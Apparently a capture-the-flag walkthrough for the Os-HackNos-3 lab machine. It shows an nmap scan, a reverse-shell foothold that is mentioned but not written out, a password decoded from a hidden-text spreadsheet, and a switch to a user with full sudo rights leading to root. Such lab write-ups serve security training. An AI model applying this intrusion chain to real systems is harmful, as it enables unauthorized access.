@@ -1,0 +1,130 @@
+root@ap:~/Scrivania/CTF/Os-HackNos-3# nmap -A -p- 192.168.43.45
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-06 21:08 CET
+Nmap scan report for 192.168.43.45
+Host is up (0.00038s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)
+|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)
+|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: WebSec
+MAC Address: 08:00:27:D4:A4:F2 (Oracle VirtualBox virtual NIC)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=2/6%OT=22%CT=1%CU=31631%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
+OS:=5E3C7261%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%
+OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
+OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
+OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
+OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
+OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+OS:%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.38 ms 192.168.43.45
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+
+
+
+contact@hacknos.com
+Securityx
+
+
+
+Modify index.php with reverse shell
+
+
+www-data@hacknos:/home/blackdevil$ cat user.txt
+cat user.txt
+bae11ce4f67af91fa58576c1da2aad4b
+
+
+
+www-data@hacknos:/var/local$ cat database
+cat database
+Expenses
+Software Licenses,$2.78
+Maintenance,$68.87
+Mortgage Interest,$70.35
+Advertising,$9.78
+Phone,$406.80
+Insurance,$9.04
+Opss;fackespreadsheet
+
+
+http://www.spammimic.com/spreadsheet.php
+Security@x@
+
+
+ww-data@hacknos:/var/local$ su blackdevil
+su blackdevil
+Password: Security@x@
+
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+blackdevil@hacknos:/var/local$ cd
+cd
+blackdevil@hacknos:~$ ls
+ls
+user.txt
+blackdevil@hacknos:~$ sudo -l
+sudo -l
+[sudo] password for blackdevil: Security@x@
+
+Matching Defaults entries for blackdevil on hacknos:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User blackdevil may run the following commands on hacknos:
+    (ALL : ALL) ALL
+blackdevil@hacknos:~$ 
+
+blackdevil@hacknos:~$ ls
+ls
+user.txt
+blackdevil@hacknos:~$ cd /root
+cd /root
+bash: cd: /root: Permission denied
+blackdevil@hacknos:~$ sudo su
+sudo su
+root@hacknos:/home/blackdevil# 
+root@hacknos:/home/blackdevil# cd /root	
+cd /root
+root@hacknos:~# ls
+ls
+root.txt  snap
+root@hacknos:~# cat root.txt
+cat root.txt
+########    #####     #####   ########         ########  
+##     ##  ##   ##   ##   ##     ##            ##     ## 
+##     ## ##     ## ##     ##    ##            ##     ## 
+########  ##     ## ##     ##    ##            ########  
+##   ##   ##     ## ##     ##    ##            ##   ##   
+##    ##   ##   ##   ##   ##     ##            ##    ##  
+##     ##   #####     #####      ##    ####### ##     ##
+
+
+MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b
+
+Author: Rahul Gehlaut
+
+Blog: www.hackNos.com
+
+Linkedin: https://in.linkedin.com/in/rahulgehlaut
+
+
+
+
